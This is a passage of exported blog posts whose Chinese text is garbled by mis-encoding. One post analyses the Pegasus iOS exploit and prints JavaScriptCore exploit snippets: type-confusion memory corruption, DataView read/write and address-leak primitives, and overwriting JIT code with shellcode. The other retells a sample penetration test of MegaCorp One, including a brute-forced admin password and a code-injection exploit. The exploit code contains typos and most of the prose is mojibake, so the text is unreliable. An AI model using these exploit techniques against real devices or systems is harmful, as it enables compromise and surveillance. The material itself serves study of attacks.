æ–‡ä»¶ã€‚ç„¶åPegasusåˆ©ç”¨jscäºŒè¿›åˆ¶æ–‡ä»¶ä¸­çš„é”™è¯¯è½¬æ¢æ¥æ‰§è¡Œæœªç­¾åçš„ä»£ç å¹¶é‡æ–°åˆ©ç”¨å†…æ ¸ã€‚ JavaScriptCoreå†…å­˜æŸåé—®é¢˜è¯¥é—®é¢˜å­˜åœ¨äºJavaScriptç»‘å®šçš„setImpureGetterDelegateï¼ˆï¼‰ä¸­ï¼ˆç”±functionSetImpureGetterDelegateæ”¯æŒï¼‰ã€‚ 12345678910111213EncodeJSValue JSC_HOST_CALL functionSetImpureGetterDelegate(ExecState* exec)&#123; JSLockHolder lock(exec); JSValue base = exec-&gt;argument(0)ï¼› if(!base.isObject()) return JSValue::encode(jsUndefined()); JSValue delegate =exec-&gt;argument(1); if(!delegate.isObject()) return JSValue::encode(jsUndefined()); ImpureGetter* impureGetter = jsCast&lt;ImpureGetter*&gt;(asObject(base.asCell())); impureGetter-&gt;setDelegate(exec-&gt;vm(), asObject(delegate.asCell())); return JSValue::encode(jsUndefined());&#125; è¿™ä¸ªç»‘å®šæœ‰ä¸¤ä¸ªå‚æ•°ï¼šç¬¬ä¸€ä¸ªæ˜¯ImpureGetterï¼Œç¬¬äºŒä¸ªæ˜¯å°†è¢«è®¾ç½®ä¸ºImpureGetter delegateçš„é€šç”¨JSObjectã€‚è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºç¼ºä¹éªŒè¯ï¼ŒJSObjectä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°å®é™…ä¸Šæ˜¯ä¸€ä¸ªæ ¼å¼æ­£ç¡®çš„ImpureGetterã€‚å½“å¦ä¸€ä¸ªå¯¹è±¡ç±»å‹ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ é€’æ—¶ï¼Œå¯¹è±¡æŒ‡é’ˆå°†ä¸æ­£ç¡®åœ°å‘ä¸‹è½¬æ¢ä¸ºImpureGetteræŒ‡é’ˆã€‚ éšåï¼Œå½“é€šè¿‡setDelegateï¼ˆ)è®¾ç½®m_delegateæ—¶ï¼ŒæŒ‡å‘ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ä¼ é€’çš„JSObjectçš„æŒ‡é’ˆå°†å†™å…¥ä¸m_delegateå¯¹é½çš„åç§»é‡ï¼ˆ16ä¸ªå­—èŠ‚åˆ°æä¾›çš„å¯¹è±¡ä¸­ï¼‰ã€‚æ­¤é—®é¢˜å¯ç”¨äºåˆ›å»ºä¸€ä¸ªåŸè¯­ï¼Œå…è®¸å°†æŒ‡å‘ä»»æ„JSObjectçš„æŒ‡é’ˆå†™å…¥16ä¸ªå­—èŠ‚åˆ°ä»»ä½•å…¶ä»–JSObjectä¸­ã€‚ æ”»å‡»Pegasusåˆ©ç”¨æ­¤é—®é¢˜åœ¨iOSåº”ç”¨ç¨‹åºæ‰§è¡Œæ—¶å®ç°æœªç­¾åä»£ç æ‰§è¡Œã€‚ä¸ºäº†è·å¾—å¯¹æ‰§è¡Œæµç¨‹çš„æ§åˆ¶ï¼Œè¯¥æ”»å‡»åˆ©ç”¨äº†è®¸å¤šDataViewå¯¹è±¡ã€‚ä½¿ç”¨DataViewæ˜¯å› ä¸ºå®ƒä»¬æä¾›äº†ä¸€ç§ç®€å•çš„æœºåˆ¶æ¥è¯»å–å’Œå†™å…¥å‘é‡ä¸­çš„ä»»æ„åç§»é‡ã€‚DataViewå¯¹è±¡åœ¨16å­—èŠ‚åç§»å¤„æœ‰ä¸€ä¸ªæŒ‡å‘ç¼“å†²åŒºçš„æŒ‡é’ˆã€‚åˆ©ç”¨è¿™äº›æŸåçš„DataViewå¯¹è±¡ï¼Œæ¼æ´åˆ©ç”¨ç¨‹åºå®‰è£…è·å–ä»»æ„æœ¬æœºä»£ç æ‰§è¡Œæƒæ‰€éœ€çš„å·¥å…· - å³è¯»/å†™åŸè¯­ä»¥åŠæš´éœ²ä»»æ„JavaScriptå¯¹è±¡åœ°å€ã€‚å®Œæˆæ­¤è®¾ç½®åï¼Œæ¼æ´åˆ©ç”¨ç¨‹åºå°±å¯ä»¥åˆ›å»ºåŒ…å«æœ¬æœºä»£ç payloadçš„å¯æ‰§è¡Œæ˜ å°„ã€‚ ä»¥ä¸‹éƒ¨åˆ†è¯¦ç»†ä»‹ç»äº†æ­¤è¿‡ç¨‹çš„å„ä¸ªé˜¶æ®µã€‚ è·å–ä»»æ„è¯»/å†™åŸè¯­å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç ç‰‡æ®µè·å–ç”¨äºDataViewå¯¹è±¡çš„ä»»æ„åç§»é‡çš„è¯»/å†™åŸè¯­ã€‚123456var dummy_ab = new ArrayBuffer(0x20);var dataview_init_rw = new DataView(dummy_ab);...var dataview_rw = new DataView (dummy_ab);...setImpureGetterDalagate(dataview_init_rw, dataview_rw); é¦–å…ˆï¼Œä½¿ç”¨è™šæ‹ŸArrayBufferä½œä¸ºä¸¤è€…çš„åå¤‡å‘é‡åˆ›å»ºä¸¤ä¸ªDataViewã€‚æ¥ä¸‹æ¥ï¼Œåˆ©ç”¨æŒ‡å‘dataview_rwçš„æŒ‡é’ˆæ¥åˆ©ç”¨è¯¥é—®é¢˜æ¥ç ´ådataview_init_rwçš„m_vectoræˆå‘˜ã€‚å¯¹dataview_init_rw åç»­è¯»å–å’Œå†™å…¥ï¼ŒDataViewä¼šè®©dataview_rwçš„ä»»ä¸€æˆå‘˜æ³„éœ²æˆ–é‡å†™ã€‚æ¥ä¸‹æ¥ï¼Œå¯¹è¯¥å¯¹è±¡çš„æ§åˆ¶ç”¨äºè·å¾—æ•´ä¸ªè¿›ç¨‹å­˜å‚¨å™¨çš„è¯»/å†™åŸè¯­ã€‚123456789var DATAVIEW_ARRAYBUFFER_OFFSET = 0x10;var DATAVIEW_BYTELENGTH_OFFSET = DATAVIEW_ARRAYBUFFER_OFFSET + 4;var DATAVIEW_MODE_OFFSET = DATAVIEW_BYTELENGTH_OFFSET + 4;var FAST_TYPED_ARRAY_MODE = 0;dataview_init_rw.setUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, 0 , true);...dataview_init_rw.setUnit32(DATAVIEW_BYTELENGTH_OFFSET, 0xFFFFFFFF , true);...dataview_init_rw.setUnit8(DATAVIEW_MODE_OFFSET, FAST_TYPED_ARRAY_MODE, true); å‘dataview_rw DataViewä¸­å†™å…¥ä¸‰ä¸ªåç§»é‡ã€‚é¦–å…ˆï¼ŒæŒ‡å‘åå¤‡å‘é‡çš„æŒ‡é’ˆæŒ‡å‘é›¶åœ°å€ã€‚ç„¶åå°†DataViewçš„é•¿åº¦è®¾ç½®ä¸º0xFFFFFFFFï¼Œæœ‰æ•ˆåœ°è®¾ç½®DataViewä»¥æ˜ å°„è¿›ç¨‹çš„æ‰€æœ‰è™šæ‹Ÿå†…å­˜ã€‚æœ€åï¼Œå°†æ¨¡å¼è®¾ç½®ä¸ºç®€å•ç±»å‹ï¼ˆå³FastTypedArrayï¼‰ï¼Œå…è®¸åœ¨ç»™å®šè™šæ‹Ÿåœ°å€çš„æƒ…å†µä¸‹å°†åç§»é‡è®¡ç®—åˆ°DataViewä¸­ã€‚dataview_rw DataViewç°åœ¨é€šè¿‡å®ƒå…¬å¼€çš„getTypeå’ŒsetTypeæ–¹æ³•æä¾›ä»»æ„è¯»/å†™åŸè¯­ã€‚ æ³„æ¼å¯¹è±¡åœ°å€æ‰€éœ€çš„æœ€åä¸€ä¸ªåŸè¯­å¯ä»¥æš´éœ²ä»»æ„JavaScriptå¯¹è±¡çš„è™šæ‹Ÿå†…å­˜åœ°å€ã€‚ä½¿ç”¨ä¸Šé¢åˆ©ç”¨çš„ç›¸åŒé—®é¢˜æ¥æ³„æ¼å•ä¸ªå¯¹è±¡çš„åœ°å€è€Œä¸æ˜¯æš´éœ²æ•´ä¸ªå­˜å‚¨å™¨ç©ºé—´æ¥å®ç°è¯¥åŸè¯­ã€‚12345678var dummy_ab = new ArrayBuffer (0x20);...var dataview_leak_addr = new DataView ( dummy_ab);var dataview_dv_leak = new DataView (dummy_ab);setImpureGetterDelegate (dataview_dv_leak, dataview_leak_addr);...setImpureGetterDelegate (dataview_leak_addr, object_to_leak );leaked_addr = dataview_dv_leak.getUnit32(DATAVIEW_ARRAYBUFFER_OFFSET, ture); åŒæ ·ï¼Œä½¿ç”¨è™šæ‹ŸArrayBufferä½œä¸ºä¸¤è€…çš„æ”¯æŒå‘é‡åˆ›å»ºä¸¤ä¸ªDataViewã€‚æ¥ä¸‹æ¥ï¼Œç”¨æŒ‡å‘dataview_leak_addrçš„æŒ‡é’ˆæ¥åˆ©ç”¨è¯¥é—®é¢˜å»ç ´ådataview_dv_leakçš„m_vectoræˆå‘˜ã€‚ä¸ºæ³„æ¼ä»»æ„JavaScriptå¯¹è±¡çš„åœ°å€ï¼Œç¬¬äºŒæ¬¡è§¦å‘è¯¥é—®é¢˜ã€‚è¿™æ¬¡ï¼Œdataview_leak_addr DataViewçš„m_vectorè¢«éœ€æ³„éœ²çš„å¯¹è±¡çš„åœ°å€ä»£æ›¿ã€‚æœ€åï¼Œå¯ä»¥è¯»å–dataview_dv_leak DataViewä¸­åç§»16ä¸ªå­—èŠ‚çš„dwordä»¥è·å–ç›®æ ‡å¯¹è±¡çš„åœ°å€ã€‚ æœªç­¾åçš„æœ¬æœºä»£ç æ‰§è¡Œå¦‚ç¬¬1é˜¶æ®µSafariæ¼æ´åˆ©ç”¨ä¸­æ‰€ä½¿ç”¨çš„é‚£æ ·ï¼ŒPegasusåœ¨æœ¬æ”»å‡»ä¸­ä½¿ç”¨ç›¸åŒçš„æœºåˆ¶æ¥è·å–ä»£ç æ‰§è¡Œæƒé™ã€‚è¯¥æ¼æ´åˆ›å»ºäº†ä¸€ä¸ªå¯æ‰§è¡Œæ˜ å°„ï¼Œå…¶ä¸­åŒ…å«è¦æ‰§è¡Œçš„shellcodeã€‚ä¸ºäº†å®ç°è¿™ä¸ªç›®çš„ï¼Œåˆ›å»ºäº†ä¸€ä¸ªJSFunctionå¯¹è±¡ï¼ˆå«æœ‰æ•°ç™¾ä¸ªç©ºçš„try / catchå—ï¼Œç¨åå°†è¢«è¦†ç›–ï¼‰ã€‚ä¸ºäº†å¸®åŠ©ç¡®ä¿JITå°†JavaScriptç¼–è¯‘ä¸ºæœ¬æœºä»£ç ï¼Œéšåä¼šé‡å¤è°ƒç”¨è¯¥å‡½æ•°ã€‚é‰´äºJavaScriptCoreåº“çš„æ€§è´¨ï¼Œæ­¤JITç¼–è¯‘çš„æœ¬æœºä»£ç å°†é©»ç•™åœ¨æ˜ å°„ä¸ºè¯»/å†™/æ‰§è¡Œçš„å†…å­˜åŒºåŸŸä¸­ã€‚12345678var body =' 'for (var k=0; k&lt;0x600; k++)&#123; body+= 'try () catch(e) ();';&#125;var to_overwrite = new Function('a', body);for (var i=0;i&lt;0x10000; i++)&#123; to_overwrite();&#125; ç„¶åå¯ä»¥è¯»å–æ­¤JSFunctionå¯¹è±¡çš„åœ°å€ï¼Œå¹¶ä¸”å¯ä»¥è¯»å–å„ç§æˆå‘˜ä»¥è·å–RWXæ˜ å°„çš„åœ°å€ã€‚ç„¶åç”¨shellcodeè¦†ç›–JITed try / catchå—ï¼Œå¹¶ä¸”å¯ä»¥ç®€å•åœ°è°ƒç”¨to_overwriteï¼ˆï¼‰å‡½æ•°æ¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚","categories":[],"tags":[{"name":"ios","slug":"ios","permalink":"http://finsenty54.github.io/tags/ios/"}]},{"title":"penetration test report interpretation","slug":"penetration-test-report-interpretation","date":"2019-03-28T08:45:25.000Z","updated":"2019-04-26T07:52:02.000Z","comments":true,"path":"2019/03/28/penetration-test-report-interpretation/","link":"","permalink":"http://finsenty54.github.io/2019/03/28/penetration-test-report-interpretation/","excerpt":"è€å¸ˆå¸ƒç½®çš„ä¸€é¡¹ä»»åŠ¡ï¼Œdeployä¸°å¯Œåšå®¢ æ¸—é€æµ‹è¯•æŠ¥å‘Šç›®å½•æ‰§è¡Œæ€»ç»“ 3ç»“è®ºæ€»ç»“ 3æ”»å‡»è®°å™ 3è¿œç¨‹ç³»ç»Ÿè°ƒæŸ¥ 3ç®¡ç†å‘˜ç½‘ç»œæœåŠ¡å™¨ç•Œé¢æ”»å‡» 5å‘½ä»¤è§£æå™¨åˆ°ç®¡ç†æœåŠ¡å™¨ 7ææƒ 9JAVAå®¢æˆ·æœºæ”»å‡» 9å‡çº§ä¸ºæœ¬åœ°ç®¡ç†å‘˜ 11æ·±åŒ…æ£€æµ‹è§„é¿ 12","text":"è€å¸ˆå¸ƒç½®çš„ä¸€é¡¹ä»»åŠ¡ï¼Œdeployä¸°å¯Œåšå®¢ æ¸—é€æµ‹è¯•æŠ¥å‘Šç›®å½•æ‰§è¡Œæ€»ç»“ 3ç»“è®ºæ€»ç»“ 3æ”»å‡»è®°å™ 3è¿œç¨‹ç³»ç»Ÿè°ƒæŸ¥ 3ç®¡ç†å‘˜ç½‘ç»œæœåŠ¡å™¨ç•Œé¢æ”»å‡» 5å‘½ä»¤è§£æå™¨åˆ°ç®¡ç†æœåŠ¡å™¨ 7ææƒ 9JAVAå®¢æˆ·æœºæ”»å‡» 9å‡çº§ä¸ºæœ¬åœ°ç®¡ç†å‘˜ 11æ·±åŒ…æ£€æµ‹è§„é¿ 12Citrixç¯å¢ƒä¸‹çš„æ¼æ´ 14å‡çº§ä¸ºåŸŸç®¡ç†å‘˜ 17æ€»è®º 19å»ºè®® 20é£é™©ç­‰çº§ 20é™„å½•Aï¼šæ¼æ´ç»†èŠ‚åŠå‡è½»å±å®³ 21é£é™©ç­‰çº§èŒƒå›´ 21é»˜è®¤çš„æˆ–å¼±çš„å‡­è¯ 21å¯†ç é‡ç”¨ 21å…±äº«æœ¬åœ°ç®¡ç†å‘˜å¯†ç  21è¡¥ä¸ç®¡ç† 21DNSåŒºåŸŸä¼ é€ 22é»˜è®¤APACHEæ–‡ä»¶ç›®å½• 22é™„å½•B:å…³äºOffensive Security 22 æ‰§è¡Œæ€»ç»“ä¸ºäº†æ£€æµ‹ç»è¿‡ä¸€æ¬¡è“„æ„æ”»å‡»ä¸­åä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼ŒMegaCory OneæˆæƒOffensive Securityè¿›è¡Œäº†è¿™ä¸€æ¬¡çš„æ¸—é€æµ‹è¯•ã€‚æˆ‘ä»¬æœ‰ä¸€ä¸ªå‡†åˆ™ï¼Œå°±æ˜¯ä¸ºäº†æ¨¡æ‹Ÿä¸€ä¸ªè“„æ„çš„æ”»å‡»è€…ï¼Œè¿™ä¸ªæ”»å‡»è€…çƒ­è¡·äºæ”»å‡»MegaCory Oneçš„ç³»ç»Ÿï¼Œå¹¶ä¸”æˆ‘ä»¬è¦è¾¾åˆ°ä¸‹åˆ—ç›®çš„ï¼š ï¬ ç¡®è®¤è¿œç¨‹æ”»å‡»è€…èƒ½å¦ç ´åMegaCory Oneçš„é˜²å¾¡ç³»ç»Ÿï¬ ç¡®è®¤æ”»å‡»æ‰€å¸¦æ¥çš„å½±å“:ï¬ å…¬å¸é‡è¦æ•°æ®æ˜¯å¦æ³„éœ²ï¬ MegaCory Oneä¿¡æ¯ç³»ç»Ÿå†…éƒ¨ç»“æ„æ˜¯å¦æ³„éœ²ä»¥åŠæ˜¯å¦å¯ç”¨ æˆ‘ä»¬çš„å·¥ä½œä¸»è¦æ˜¯åœ¨ç¡®è®¤å’Œåˆ©ç”¨ç³»ç»Ÿæ¼æ´ä¸Šï¼Œè¿œç¨‹æ”»å‡»è€…å¯ä»¥é€šè¿‡è¿™äº›æ¼æ´ä»¥æœªæˆæƒçš„æ–¹å¼è·å¾—ä¸€äº›é‡è¦æ•°æ®ã€‚è¿™äº›æ”»å‡»æ–¹å¼å¯èƒ½ä¸€ä¸ªåªä¼šä¸Šç½‘çš„äººä¹Ÿå¯ä»¥ç”¨ã€‚è¯„ä¼°æ˜¯æŒ‰ç…§NIST SP 800-115 ä¸­çš„æ ‡å‡†ä¸‹è¿›è¡Œçš„ï¼Œå¹¶ä¸”æ‰€æœ‰çš„æµ‹è¯•éƒ½æ˜¯å¯æ§çš„ã€‚ ç»“è®ºæ€»ç»“å¯¹äºMegaCorp Oneå…¬å¸ç³»ç»Ÿçš„ç¬¬ä¸€æ¬¡æ£€æµ‹ï¼Œå°±å‘ç°äº†ä¸€ä¸ªé”™è¯¯é…ç½®çš„DNSæœåŠ¡å™¨ï¼Œå…¶å…è®¸è¿›è¡ŒåŒºåŸŸä¼ é€ã€‚è¿™ä¸ªæ¼æ´ç»™æ£€æµ‹æä¾›äº†è®¸å¤šå¯ä¾›æ”»å‡»çš„ä¸»æœºã€‚æ£€æŸ¥äº†è¿™äº›ä¸»æœºåï¼Œå‘ç°ä¸€ä¸ªå—å¯†ç ä¿æŠ¤çš„ç½‘ç«™æœåŠ¡å™¨ç•Œé¢ã€‚æˆ‘ä»¬é€šè¿‡ç©·ä¸¾æ”»å‡»çˆ†å‡ºäº†å¯†ç ä»è€Œèƒ½å¤Ÿè¿›å…¥ç½‘ç«™ï¼Œåœ¨å»ºäº†ç¬¦åˆç½‘ç«™å¯†ç çš„æ ¼å¼çš„éšæœºå­—æ¯è¡¨åã€‚ è¿™ä¸ªç®¡ç†ç•Œé¢éå¸¸è„†å¼±ï¼Œå› ä¸ºæœ‰ä¸€ä¸ªè¿œç¨‹ä»£ç æ³¨å…¥æ¼æ´ï¼Œé€šè¿‡è¿™ä¸ªæ¼æ´å¯ä»¥è·å¾—å¯¹åº•å±‚æ“ä½œç³»ç»Ÿè®¿é—®çš„æƒé™ã€‚å› ä¸ºæ²¡æœ‰æ­£ç¡®çš„ç³»ç»Ÿæ›´æ–°ï¼Œè€Œä½¿æœ€åˆçš„å°é—®é¢˜å˜æˆäº†å¤§é—®é¢˜ã€‚è¿›ä¸€æ­¥æ£€æŸ¥åï¼Œå‘ç°ç®¡ç†ç”¨æˆ·å¯ä»¥åœ¨è¿™ä¸ªå—æŸçš„æœåŠ¡å™¨ä¸Šè¿è¡Œç€ä¸€ä¸ªJAVAç¨‹åºã€‚å½“æˆ‘ä»¬ä¸Šä¼ äº†æ¶æ„ä»£ç åï¼Œå–å¾—äº†è®¿é—®æƒé™ã€‚ åˆ©ç”¨è¿™ä¸ªæœåŠ¡å™¨çˆ†å‡ºçš„å¯†ç ï¼Œæˆ‘ä»¬èƒ½å¤Ÿè®¿é—®å…ˆå‰ä¸èƒ½è®¿é—®çš„èµ„æºã€‚è¿™ä½¿å¾—æˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨æœ¬åœ°è´¦æˆ·å°±å¯ä»¥ç™»å½•è®¸å¤šçš„WINDOWSä¸»æœºï¼Œä¸€ä¸ªCITRIXçš„æœåŠ¡å™¨ï¼Œè¿˜æœ‰å¯¹äºWINDOWSæ´»åŠ¨ç›®å½•å®Œæ•´çš„æƒé™ã€‚é€šè¿‡å°†æ¶æ„æµé‡å°è£…è¿›åè®®é‡Œï¼Œç°æœ‰çš„æ¶æ„æµé‡æ§åˆ¶å°±å¯ä»¥é¿å¼€ã€‚ æ”»å‡»è®°å™è¿œç¨‹ç³»ç»Ÿè°ƒæŸ¥ä¸ºäº†æ›´å¥½çš„è¯„ä¼°ï¼ŒMegaCorp Oneæä¾›äº†å¾ˆå°‘çš„ä¿¡æ¯ï¼Œé™¤äº†ç»„ç»‡çš„åŸŸå:megacorpone.comã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æ›´ç¬¦åˆä¸€ä¸ªæ²¡æœ‰å¾—åˆ°å†…éƒ¨ä¿¡æ¯çš„æ”»å‡»è€…ã€‚ä¸ºäº†é¿å…æ”»å‡»å…¶ä»–ç»„ç»‡çš„ç³»ç»Ÿï¼Œåœ¨æ”»å‡»å‰ï¼Œæ‰€æœ‰ç³»ç»Ÿéƒ½è¿›è¡Œäº†æ‰€æœ‰æƒéªŒè¯ã€‚ æˆ‘ä»¬æ£€æŸ¥äº†megacorpone.comåŸŸåçš„DNSæœåŠ¡å™¨ï¼ŒæŸ¥çœ‹æœ‰æ²¡æœ‰å¯èƒ½çš„æ”»å‡»ç›®æ ‡ã€‚ Figure 1-é€šè¿‡æ”¶é›†åŸŸåçš„ä¿¡æ¯æ‰¾åˆ°äº†ä¸‰ä¸ªDNSæœåŠ¡å™¨ åˆ©ç”¨è¿™å‡ ä¸ªæœåŠ¡å™¨ï¼Œæˆ‘ä»¬è¯•ç€å»è¿›è¡ŒåŒºåŸŸä¼ è¾“ã€‚å‘ç°ns2.megacorpone.comçš„åŒºåŸŸä¼ è¾“é…ç½®é”™è¯¯ã€‚è¿™æš´éœ²äº†è®¸å¤šçš„ä¸»æœºåå’Œå…¶ç›¸å…³çš„IPåœ°å€ï¼Œè¿™éå¸¸æœ‰å¸®åŠ©ã€‚ï¼ˆFigure 2ï¼‰åŒºåŸŸä¼ è¾“æä¾›ç»™æ”»å‡»è€…è¯¦ç»†çš„ä¿¡æ¯ï¼Œè¿™ä¸ªç»„ç»‡çš„èŒèƒ½ï¼Œç½‘æ®µã€‚è¯¦ç»†è¯·çœ‹é™„å½•Aã€‚ Figure 2-ä¸€ä¸ªé”™è¯¯é…ç½®çš„DNSæœåŠ¡å™¨ï¼Œå…è®¸å®Œæ•´çš„äº”é™åˆ¶çš„åŒºåŸŸä¼ è¾“ è¿™äº›è¯†åˆ«å‡ºçš„ä¸»æœºæäº¤ç»™äº†MegaCorp Oneç¡®è®¤ï¼Œç¡®å®šæ•´ä¸ª50.7.67.Xç½‘æ®µéƒ½è¦åœ¨è¯„ä¼°èŒƒå›´å†…ã€‚è¿™äº›ä¸»æœºä¼šè¢«æ‰«æï¼Œæ¥ç€åˆ—ä¸¾å‡ºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„æœåŠ¡ã€‚ä¸ºäº†ç¡®å®šè¿™äº›æœåŠ¡å™¨æ½œåœ¨çš„æ¼æ´ï¼Œå®ƒä»¬ä¼šè¢«ä»”ç»†çš„æ£€æŸ¥ã€‚ é€šè¿‡æšä¸¾æŠ€æœ¯å’Œç½‘ç»œæ‰«æï¼Œå¯ä»¥å»ºç«‹ä¸€ä¸ªæ˜ å°„MegaCorp Oneç½‘ç»œçš„ç»“æ„ã€‚ åœ¨Figure 3ä¸­å±•ç¤ºäº†ç›®æ ‡ç½‘ç»œç»“æ„ã€‚ä¾‹å¦‚æ·±åŒ…æ£€æŸ¥è¿™æ ·çš„é¢å¤–æ§åˆ¶ç»†èŠ‚ï¼Œä¼šåœ¨æ¥ä¸‹æ¥çš„è¯„ä¼°ä¸­æåˆ°ï¼Œè¿™é‡Œä¸ºå®Œæ•´æ€§ï¼Œå…ˆè¯´ä¸€ç‚¹ã€‚ Figure 3-ç›®æ ‡ç½‘ç»œ ç®¡ç†å‘˜ç½‘ç»œæœåŠ¡å™¨ç•Œé¢æ”»å‡»Admin.megacorpone.comæœåŠ¡å™¨åœ¨81ç«¯å£ä¸Šè¿è¡Œç€ApacheæœåŠ¡ã€‚é€šè¿‡ç«™ç‚¹çš„æ ¹URLè®¿é—®ï¼Œå‘ç°äº†ä¸€ä¸ªç©ºç™½é¡µé¢ã€‚æ¥ä¸‹æ¥ï¼Œè¿›è¡Œä¸€æ¬¡å¿«é€Ÿçš„æšä¸¾æ‰«æï¼Œä»¥æœŸæ‰¾åˆ°å…¬ç”¨ç›®å½•å’Œæ–‡ä»¶ã€‚ï¼ˆFigure 4ï¼‰ Figure 4-admin.megacorpone.comçš„æšä¸¾æ”»å‡»æ­éœ²äº†ç½‘ç«™çš„æ–‡ä»¶ç»“æ„ æ‰«é¢çš„ç»“æœæ˜¾ç¤ºæ²¡æœ‰æ”¹å˜Apacheå…¬å…±é»˜è®¤ç›®å½•(è¯¦ç»†è¯·çœ‹é™„å½•A)ï¼Œæˆ‘ä»¬ç¡®å®š/adminæ˜¯å”¯ä¸€å¯é€šè¿‡èº«ä»½éªŒè¯çš„ç›®å½•ã€‚ï¼ˆFigure 5ï¼‰ Figure 5-adminç›®å½•å—å¯†ç ä¿æŠ¤ æˆ‘ä»¬å®šä½œäº†ä¸€ä¸ªåŸºäºè¯¥ç½‘ç«™å†…å®¹çš„å­—å…¸æ–‡ä»¶ï¼Œä¸ºäº†æš´åŠ›ç ´è§£å¯†ç ã€‚æœ€åˆçš„å­—å…¸åŒ…æ‹¬äº†331ä¸ªç‰¹æ„å­—ç¬¦ä¸²ï¼Œé€šè¿‡å‡ è½®ç½®æ¢ï¼Œå½¢æˆäº†æœ‰16201ä¸ªå­—ç¬¦ä¸²çš„å­—å…¸æ–‡ä»¶ã€‚ç”¨adminçš„ç”¨æˆ·åå’Œè¿™ä¸ªå­—å…¸æ¥æš´åŠ›ç ´è§£ã€‚ Figure 6-ä½¿ç”¨å­—å…¸æ”»å‡»æ¥è·å¾—ç®¡ç†å‘˜å¯†ç  æš´åŠ›æ”»å‡»æ‰¾åˆ°äº†adminç”¨æˆ·çš„å¯†ç â€nanotechnology1â€ã€‚åˆ©ç”¨è¿™ä¸ªè´¦æˆ·å°±èƒ½ä¸€æœªæˆæƒçš„æ–¹å¼å¾—åˆ°ç½‘ç«™å—ä¿æŠ¤éƒ¨åˆ†çš„å†…å®¹ã€‚ï¼ˆFigure 6ï¼‰è¯¦ç»†è¯·çœ‹é™„å½•Aï¼Œæ€ä¹ˆåˆ©ç”¨è¿™ä¸ªæ¼æ´ã€‚ è¿™é‡Œé¢æœ‰ä¸€ä¸ªSQLite ManageræœåŠ¡ç•Œé¢ï¼Œæ— éœ€ä»»ä½•å‡­è¯å°±å¯ä»¥è®¿é—®ã€‚åˆ©ç”¨è¿™ä¸ªç•Œé¢ï¼Œå‘ç°æ”¯æŒphpSQLiteCMSå®ä¾‹çš„æ•°æ®åº“ã€‚http://phpsqlitecms.net/ Figure 7-ç½‘ç«™è¿è¡Œç€SQLiteæ•°æ®åº“ é€šè¿‡è¿™ä¸ªç•Œé¢å°±å¯ä»¥è·å¾—æ•°æ®ï¼Œæ¯”å¦‚ç”¨æˆ·åï¼Œä»¥åŠç›¸å…³çš„å¯†ç å“ˆå¸Œå€¼ã€‚ï¼ˆFigure 8ï¼‰ Figure 8-ç¼ºå°‘é¢å¤–çš„è®¾ç½®ï¼Œæ”»å‡»è€…å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è·å¾—æ•°æ®ï¼Œä»â€userdataâ€è¿™ä¸ªæ•°æ®åº“ è¡¨ä¸­çš„å¯†ç hashå€¼ä¸ç¬¦åˆä»»ä½•æ ‡å‡†çš„æ ¼å¼ã€‚ä½¿ç”¨ä¸€ä¸ªå«â€phpselitecmsâ€çš„è½¯ä»¶ï¼ŒæŸ¥çœ‹æºä»£ç ä»¥ç¡®å®šhashå€¼æ˜¯æ€ä¹ˆäº§ç”Ÿçš„ã€‚å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½æ˜¯hashè´¦æˆ·çš„å¯†ç ã€‚ Figure 9-æŸ¥çœ‹æºç å‘ç°å¯†ç hashç”Ÿæˆç®—æ³• çŸ¥é“äº†å¯†ç hashçš„æ ¼å¼ï¼Œè¿˜æœ‰éšæ„ç”Ÿæˆçš„åä¸ªå­—ç¬¦çš„saltå€¼ï¼Œå¯ä»¥å°†è¿™äº›hashå€¼è½¬å˜æˆç­‰ä»·çš„åŠ äº†saltçš„SHA1å€¼ï¼Œè¿›è¡Œæš´åŠ›æ”»å‡»ã€‚ å¾—åˆ°äº†ä¸¤ä¸ªæ˜æ–‡å¯†ç ï¼Œå°½ç®¡ä¸æ˜¯ç«‹é©¬å°±æœ‰ç”¨ï¼Œä½†å¯èƒ½åœ¨ç»„ç»‡é‡Œå…¶ä»–çš„ç³»ç»Ÿä¸­å¯ä»¥ç”¨åˆ°ã€‚ å‘½ä»¤è§£æå™¨åˆ°ç®¡ç†æœåŠ¡å™¨å…ˆå‰å‘ç°çš„SQLite Manageræœ‰ä¸€ä¸ªè‘—åçš„ä»£ç æ³¨å…¥æ¼æ´ã€‚(https://www.exploit-db.com/exploits/24320)åˆ©ç”¨è¿™ä¸ªæ¼æ´å¯ä»¥è·å¾—shellï¼Œè¿›å…¥ç½‘ç«™æœåŠ¡å™¨ç”¨æˆ·ä½¿ç”¨çš„ç³»ç»Ÿã€‚ä½¿ç”¨ä¸€ä¸ªæ”¹è‰¯è¿‡çš„å…¬å…±æ¼æ´åˆ©ç”¨åº“ï¼Œå¯ä»¥å¾—åˆ°admin.megacorpone.comæœåŠ¡å™¨ä¸Šæœ‰é™çš„äº¤äº’æƒã€‚è¯¦ç»†è¯·çœ‹é™„å½•A. Figure 10-åˆ©ç”¨ä¸€ä¸ªå…¬å¼€çš„å¯ç”¨çš„SQLiteæ¼æ´ï¼Œå°±èƒ½ä»¥æœªæˆæƒçš„æ–¹å¼è¿›å…¥ç³»ç»Ÿ Figure 11-åªèƒ½å–å¾—www-dataè¿™ä¸ªç”¨æˆ·çš„æƒé™ MegaCorp Oneä½¿ç”¨çš„SQLite Managerçš„ç‰ˆæœ¬å’Œè¯¥å­˜åœ¨è¯¥æ¼æ´çš„ç‰ˆæœ¬æœ‰ä¸€äº›ä¸åŒã€‚å°½ç®¡ä½¿ç”¨çš„ç‰ˆæœ¬ä¹ŸåŒæ 